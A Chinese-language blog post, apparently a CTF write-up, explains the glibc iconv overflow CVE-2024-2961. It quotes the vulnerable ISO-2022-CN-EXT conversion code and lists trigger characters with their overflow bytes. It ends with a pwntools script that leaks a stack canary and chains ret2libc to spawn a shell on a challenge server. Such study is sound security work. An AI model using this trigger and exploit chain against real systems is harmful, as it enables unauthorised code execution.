
<!DOCTYPE html>
<html lang="ch">
<head>
    <meta charset="utf-8" />
    <title>CVE-2024-2961 | Collectcrop&#39;s Blog</title>
    <meta name="author" content="collectcrop" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>COLLECTCROP&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;COLLECTCROP&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>CVE-2024-2961</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/9/21
        </span>
        
        <span class="category">
            <a href="/categories/pwn/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                pwn
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/pwn/" style="color: #ffa2c4">
                    pwn
                </a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/CVE/" style="color: #00bcd4">
                    CVE
                </a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <h2 id="iconv-cve-2024-2961"><a href="#iconv-cve-2024-2961" class="headerlink" title="iconv-cve-2024-2961"></a>iconv-cve-2024-2961</h2><h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
<h4 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h4><p>以从UTF-8转义到ISO-2022-CN-EXT为例。要触发此漏洞，我们需要迫使iconv()在输出缓冲区结束前发出一个转义序列。为此，我们可以使用诸如“劄”、“䂚”、“峛“等特殊字符。这将导致1到3字节的溢出，其溢出内容如下：</p>
<pre><code>字符 |		溢出内容		|		原UTF-8表示
劄  		$*H [24 2A 48]      	  \xe5\x8a\x84
䂚  		$+J [24 2B 4A]			  \xe4\x82\x9a
峛  		$*H [24 2A 48]			  \xe5\xb3\x9b
</code></pre>
<h4 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h4><p>先贴一张2.27libc中的漏洞点关键代码，具体可在pathToYourLibc&#x2F;iconvdata&#x2F;iso-2022-cn-ext.c中查看</p>
<pre><code class="c">#define ESC	0x1b
enum&#123;
    ASCII_set = 0,
      GB2312_set,		//1
      GB12345_set,	//2
      CNS11643_1_set,	//3
      ISO_IR_165_set,	//4
      SO_mask = 7,

      GB7589_set = 1 &lt;&lt; 3,
      GB13131_set = 2 &lt;&lt; 3,
      CNS11643_2_set = 3 &lt;&lt; 3,
      SS2_mask = 3 &lt;&lt; 3,

      GB7590_set = 1 &lt;&lt; 5,
      GB13132_set = 2 &lt;&lt; 5,
      CNS11643_3_set = 3 &lt;&lt; 5,
      CNS11643_4_set = 4 &lt;&lt; 5,
      CNS11643_5_set = 5 &lt;&lt; 5,
      CNS11643_6_set = 6 &lt;&lt; 5,
      CNS11643_7_set = 7 &lt;&lt; 5,
      SS3_mask = 7 &lt;&lt; 5,
&#125;
...........................................................
/* See whether we have to emit an escape sequence.  */		      
    if (set != used)						      
      &#123;								      
        /* First see whether we announced that we use this		      
           character set.  */					      
        if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))	      
          &#123;								      
        const char *escseq;					      
                                          
        if (outptr + 4 &gt; outend)				      
          &#123;							      
            result = __GCONV_FULL_OUTPUT;			      
            break;						      
          &#125;							      
                                          
        assert (used &gt;= 1 &amp;&amp; used &lt;= 4);			      
        escseq = &quot;)A\0\0)G)E&quot; + (used - 1) * 2;			      
        *outptr++ = ESC;					      
        *outptr++ = &#39;$&#39;;					      
        *outptr++ = *escseq++;					      
        *outptr++ = *escseq++;					      
                                          
        ann = (ann &amp; ~SO_ann) | (used &lt;&lt; 8);			      
          &#125;								      
        else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))
          &#123;								      
        const char *escseq;					      
                                          
        assert (used == CNS11643_2_set); /* XXX */		      
        escseq = &quot;*H&quot;;						      
        *outptr++ = ESC;					      
        *outptr++ = &#39;$&#39;;					      
        *outptr++ = *escseq++;					      
        *outptr++ = *escseq++;					      
                                          
        ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; 8);			      
          &#125;								      
        else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))
          &#123;								      
        const char *escseq;					      
                                          
        assert ((used &gt;&gt; 5) &gt;= 3 &amp;&amp; (used &gt;&gt; 5) &lt;= 7);		      
        escseq = &quot;+I+J+K+L+M&quot; + ((used &gt;&gt; 5) - 3) * 2;		      
        *outptr++ = ESC;					      
        *outptr++ = &#39;$&#39;;					      
        *outptr++ = *escseq++;					      
        *outptr++ = *escseq++;					      
                                          
        ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; 8);			      
          &#125;								      
                                          
        if (used == CNS11643_2_set)					      
          &#123;								      
        if (outptr + 2 &gt; outend)				      
          &#123;							      
            result = __GCONV_FULL_OUTPUT;			      
            break;						      
          &#125;							      
        *outptr++ = SS2_0;					      
        *outptr++ = SS2_1;					      
          &#125;								      
        else if (used &gt;= CNS11643_3_set &amp;&amp; used &lt;= CNS11643_7_set)	      
          &#123;								      
        if (outptr + 2 &gt; outend)				      
          &#123;							      
            result = __GCONV_FULL_OUTPUT;			      
            break;						      
          &#125;							      
        *outptr++ = SS3_0;					      
        *outptr++ = SS3_1;					      
          &#125;								      
        else							      
          &#123;								      
        /* We only have to emit something if currently ASCII is	      
           selected.  Otherwise we are switching within the	      
           SO charset.  */					      
        if (set == ASCII_set)					      
          &#123;							      
            if (outptr + 1 &gt; outend)				      
              &#123;							      
            result = __GCONV_FULL_OUTPUT;			      
            break;						      
              &#125;							      
            *outptr++ = SO;					      
          &#125;							      
          &#125;								      
                                          
        /* Always test the length here since we have used up all the      
           guaranteed output buffer slots.  */			      
        if (outptr + 2 &gt; outend)					      
          &#123;								      
        result = __GCONV_FULL_OUTPUT;				      
        break;							      
          &#125;								      
      &#125;								      
    else if (outptr + 2 &gt; outend)					      
      &#123;								      
        result = __GCONV_FULL_OUTPUT;				      
        break;							      
      &#125;								      
                                          
    *outptr++ = buf[0];						      
    *outptr++ = buf[1];						      
    set = used;							      
      &#125;									      
                                          
    /* Now that we wrote the output increment the input pointer.  */	      
    inptr += 4;								      
  &#125;
</code></pre>
<p>其中比较重要的是知道各种mask是掩码，与目标进行按位与操作时可以提取出掩码对应位的值，也就是提取出特征信息</p>
<p><strong>used</strong>是当前正在处理的字符所属字符集的标识</p>
<p><strong>set</strong>是当前的字符集标识</p>
<p><strong>ann</strong>(annouce)是一个变量，用于记录已声明的字符集。</p>
<p><strong>outptr</strong> 是指向当前输出缓冲区位置的指针。</p>
<p><strong>outend</strong> 是指向输出缓冲区末尾（或可用空间的结束）的指针。</p>
<p><strong>inptr</strong> 是指向当前输入缓冲区位置的指针</p>
<h5 id="三种不同的字符集"><a href="#三种不同的字符集" class="headerlink" title="三种不同的字符集"></a>三种不同的字符集</h5><p>在字符编码转换中，SO（Shift Out）、SS2（Single Shift 2）和SS3（Single Shift 3）是用于指示不同字符集的特殊控制字符或转义序列。它们在处理多字节字符集（如ISO-2022）时尤其重要。以下是它们的区别和作用：</p>
<h6 id="SO-Shift-Out"><a href="#SO-Shift-Out" class="headerlink" title="SO (Shift Out)"></a>SO (Shift Out)</h6><ul>
<li><strong>用途</strong>: SO（Shift Out）是一个控制字符，用于从单字节字符集切换到多字节字符集。</li>
<li><strong>控制字符</strong>: 通常表示为0x0E。</li>
<li><strong>作用</strong>: 在ISO-2022编码中，SO字符表示后续的字节将使用特定的多字节字符集，直到遇到SI（Shift In）字符为止。SO和SI字符用于在ASCII和其他字符集之间切换。</li>
</ul>
<h6 id="SS2-Single-Shift-2"><a href="#SS2-Single-Shift-2" class="headerlink" title="SS2 (Single Shift 2)"></a>SS2 (Single Shift 2)</h6><ul>
<li><strong>用途</strong>: SS2（Single Shift 2）是一个转义序列，用于临时从主字符集切换到第二辅助字符集，仅影响紧随其后的一个字符。</li>
<li><strong>控制字符</strong>: 通常表示为0x8E。</li>
<li><strong>作用</strong>: 在处理多字节字符时，SS2指示紧随其后的一个字节应被解释为第二辅助字符集中的字符。使用SS2字符可以在不改变当前字符集的情况下使用不同的字符集中的字符。</li>
</ul>
<h6 id="SS3-Single-Shift-3"><a href="#SS3-Single-Shift-3" class="headerlink" title="SS3 (Single Shift 3)"></a>SS3 (Single Shift 3)</h6><ul>
<li><strong>用途</strong>: SS3（Single Shift 3）是一个转义序列，用于临时从主字符集切换到第三辅助字符集，仅影响紧随其后的一个字符。</li>
<li><strong>控制字符</strong>: 通常表示为0x8F。</li>
<li><strong>作用</strong>: 类似于SS2，SS3指示紧随其后的一个字节应被解释为第三辅助字符集中的字符。它允许在不改变当前字符集的情况下使用第三辅助字符集中的字符。</li>
</ul>
<p>具体不同字符集所属的类别可见源码中的枚举，mask掩码上方的字符集都是该类型的字符集</p>
<pre><code class="c">  enum&#123;
          ASCII_set = 0,
        GB2312_set,		//1
        GB12345_set,	//2
        CNS11643_1_set,	//3
        ISO_IR_165_set,	//4
        SO_mask = 7,
  
        GB7589_set = 1 &lt;&lt; 3,
        GB13131_set = 2 &lt;&lt; 3,
        CNS11643_2_set = 3 &lt;&lt; 3,
        SS2_mask = 3 &lt;&lt; 3,
  
        GB7590_set = 1 &lt;&lt; 5,
        GB13132_set = 2 &lt;&lt; 5,
        CNS11643_3_set = 3 &lt;&lt; 5,
        CNS11643_4_set = 4 &lt;&lt; 5,
        CNS11643_5_set = 5 &lt;&lt; 5,
        CNS11643_6_set = 6 &lt;&lt; 5,
        CNS11643_7_set = 7 &lt;&lt; 5,
        SS3_mask = 7 &lt;&lt; 5,
  &#125;
</code></pre>
<h5 id="实际运行中的-used-及其对应分支"><a href="#实际运行中的-used-及其对应分支" class="headerlink" title="实际运行中的 used 及其对应分支"></a>实际运行中的 used 及其对应分支</h5><p>以UTF-8转义到ISO-2022-CN-EXT为例</p>
<p>具体哪一个 <code>used</code> 的值被设置，取决于UTF-8输入字符在ISO-2022-CN-EXT字符集中的对应字符集。例如：</p>
<ul>
<li>如果输入字符是GB2312字符集中的字符，<code>used</code> 将被设置为 <code>GB2312_set</code>（值为1）。</li>
<li>如果输入字符是CNS11643-2字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_2_set</code>（值为24）。</li>
<li>如果输入字符是CNS11643-3字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_3_set</code>（值为96）。</li>
</ul>
<p>假设当前输入字符在GB2312字符集中，<code>used</code> 将被设置为 <code>GB2312_set</code>（1），并进入第一个 <code>if</code> 分支，发出对应的转义序列。类似地，对于其他字符集，<code>used</code> 将被设置为相应的值，并进入对应的 <code>if</code> 分支。</p>
<h5 id="具体执行过程"><a href="#具体执行过程" class="headerlink" title="具体执行过程"></a>具体执行过程</h5><p><strong>1. 检查是否需要发出转义序列</strong>：首先检查当前使用的字符集（<code>set</code>）是否与目标字符集（<code>used</code>）不同。如果不同，则需要发出转义序列。</p>
<p><strong>2. 判断是否已经声明使用该字符集</strong>：</p>
<p>我们现在详细分析下3个if分支的条件</p>
<p><code>if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))</code>	</p>
<ul>
<li><p>used &amp; SO_mask 在目标字符集类型为SO时不为0</p>
</li>
<li><p>(ann &amp; SO_ann) !&#x3D; (used &lt;&lt; 8)用于检测是否声明过该字符集</p>
</li>
<li><p>如果目标字符集是<code>SO</code>类型且未声明，则生成相应的转义序列。</p>
</li>
</ul>
<p><code>else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))</code></p>
<ul>
<li>如果目标字符集是<code>SS2</code>类型且未声明，则生成相应的转义序列。</li>
</ul>
<p><code>else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))</code></p>
<ul>
<li>如果目标字符集是<code>SS3</code>类型且未声明，则生成相应的转义序列。</li>
</ul>
<p>实际我们发现只有在SO的分支里有一段边界检测的代码</p>
<pre><code class="c">if (outptr + 4 &gt; outend)				      
&#123;							      
    result = __GCONV_FULL_OUTPUT;			      
    break;						     
&#125;	
</code></pre>
<p>那么我们要利用漏洞，首先就要输入一个SS2字符集或SS3字符集的字符。</p>
<p><strong>3.生成转义序列</strong>：</p>
<ul>
<li>根据<code>used</code>字符集的类型，选择相应的转义序列，并写入输出缓冲区<code>outptr</code>。&lt;—关键漏洞点</li>
<li>更新已声明的字符集<code>ann</code>。</li>
</ul>
<p><code>escseq</code> 是一个指向字符数组的指针，用于存储转义序列（escape sequence）。这些转义序列用于在输出数据中标识字符集的切换或特定字符的编码方式。</p>
<pre><code class="c">const char *escseq;

// 例如，用于 SO 的情况
escseq = &quot;)A\0\0)G)E&quot; + (used - 1) * 2;
*outptr++ = ESC;
*outptr++ = &#39;$&#39;;
*outptr++ = *escseq++;
*outptr++ = *escseq++;

// 例如，用于 SS2 的情况
escseq = &quot;*H&quot;;
*outptr++ = ESC;
*outptr++ = &#39;$&#39;;
*outptr++ = *escseq++;
*outptr++ = *escseq++;

// 例如，用于 SS3 的情况
escseq = &quot;+I+J+K+L+M&quot; + ((used &gt;&gt; 5) - 3) * 2;
*outptr++ = ESC;
*outptr++ = &#39;$&#39;;
*outptr++ = *escseq++;
*outptr++ = *escseq++;
</code></pre>
<p><strong>4.为特定字符集生成额外的字节</strong>：</p>
<ul>
<li>如果<code>used</code>是<code>CNS11643_2_set</code>，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC(即0x1b)与0x4e的后缀。</li>
<li>如果<code>used</code>在<code>CNS11643_3_set</code>到<code>CNS11643_7_set</code>之间，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC与0x4f的后缀。</li>
</ul>
<p><strong>5.切换到ASCII字符集时发出SO字节</strong>：如果当前字符集是ASCII需要切换，且<strong>outptr + 1 &lt;&#x3D; outend</strong>，则加入0x0e后缀。</p>
<p><strong>6.检查输出缓冲区长度</strong>：确保在写入新的字节前输出缓冲区<code>outptr</code>有足够的空间，否则返回<code>__GCONV_FULL_OUTPUT</code>错误。</p>
<p><strong>7.改变当前字符集（若与目标字符集不同）</strong>：<code>set = used;</code></p>
<p><strong>8.自增输入指针</strong>：处理完一个字符后，增加输入指针<code>inptr</code>。</p>
<h4 id="四、实例分析"><a href="#四、实例分析" class="headerlink" title="四、实例分析"></a>四、实例分析</h4><h5 id="XGCTF-echo"><a href="#XGCTF-echo" class="headerlink" title="XGCTF [echo]"></a>XGCTF [echo]</h5><img src="/2024/09/21/CVE-2024-2961/image-20240921185742098.png" class="">

<img src="/2024/09/21/CVE-2024-2961/image-20240921185755294.png" class="">

<img src="/2024/09/21/CVE-2024-2961/image-20240921185806653.png" class="">

<p>64位程序开了canary保护，最后有个明显的往s里读0x60字节的栈溢出，那么我们就要想办法先得到canary的值。我们发现canary实际存在var_8处，而最后iconv函数实际对输入进行换编码后会存0x26字节到s中，s与canary之间只差0x28个字节，那么我们利用iconv的漏洞，先填充0x25个垃圾字符，最后写一个会触发漏洞的字符，就可以溢出3字节刚好把canary低位的\x00给覆盖了，那么printf(“%s”,s)就能直接把canary的值打印出来了。</p>
<img src="/2024/09/21/CVE-2024-2961/image-20240921185814773.png" class="">

<p>之后有了canary，又能栈溢出，直接ret2libc即可</p>
<pre><code class="python">#coding:utf-8
from pwn import *
context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)

#p = process(&quot;./echo&quot;)
p = remote(&quot;pwn.challenge.ctf.show&quot;,28257)
libc = ELF(&quot;./libc-2.27.so&quot;)
elf = ELF(&quot;./echo&quot;)
p.send(&quot;a&quot;*0x25 + &quot;劄&quot;)
p.recvuntil(b&quot;\x48&quot;)
canary = u64(p.recv(7).rjust(8,b&quot;\x00&quot;))
log.success(&quot;canary:&quot;+hex(canary))
pop_rdi_ret = 0x401493
ret_add = 0x40101a
main_add = 0x401256
p.sendline(b&quot;a&quot;*0x28 + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(elf.got[&quot;puts&quot;]) + p64(elf.plt[&quot;puts&quot;]) + p64(main_add)) 

libc_base = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;)) - libc.sym[&quot;puts&quot;]
log.success(&quot;libc_base:&quot;+hex(libc_base))
system_add = libc_base + libc.sym[&quot;system&quot;]
bin_sh_add = libc_base + next(libc.search(b&quot;/bin/sh\x00&quot;))

p.send(&quot;collectcrop&quot;)
payload2 = b&quot;a&quot;*0x28 + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(ret_add) + p64(system_add)
p.sendline(payload2)
p.interactive()
</code></pre>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Collectcrop&#39;s Blog
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;collectcrop
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
</body>
</html>
